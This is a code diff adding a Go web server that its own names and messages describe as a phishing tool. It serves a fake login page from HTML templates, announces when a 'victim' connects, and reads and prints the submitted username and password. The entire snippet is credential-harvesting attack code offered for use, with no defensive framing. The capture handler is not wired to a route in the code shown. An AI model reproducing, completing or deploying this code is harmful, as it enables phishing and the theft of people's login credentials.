@@ -1,0 +1,25 @@
+
+var tpl *template.Template
+
+func handlerPhising(p int) {
+	port := strconv.Itoa(p)
+	tpl, _ = template.ParseGlob("WebPages/*.html")
+	http.HandleFunc("/", loginHandler)
+
+	http.ListenAndServe(":"+port, nil)
+}
+func loginHandler(w http.ResponseWriter, r *http.Request) {
+	fmt.Println("\n\n  " + Colors.Red() + " [+] " + Colors.White() + "  Victum is interacting with the server")
+	tpl.ExecuteTemplate(w, "login.html", nil)
+}
+
+// loginAuthHandler authenticates user login
+func loginAuthHandler(w http.ResponseWriter, r *http.Request) {
+
+	fmt.Println("\n\n  " + Colors.Red() + " [+] " + Colors.White() + "  Victum Credentionals ")
+	r.ParseForm()
+	username := r.FormValue("username")
+	password := r.FormValue("password")
+	fmt.Println("\n\n  " + Colors.Red() + " [*] " + Colors.White() + "  Username : " + Colors.Green() + username + Colors.White() + Colors.Red() + " \t\t[*] " + Colors.White() + " Password : " + Colors.Green() + password)
+
+}
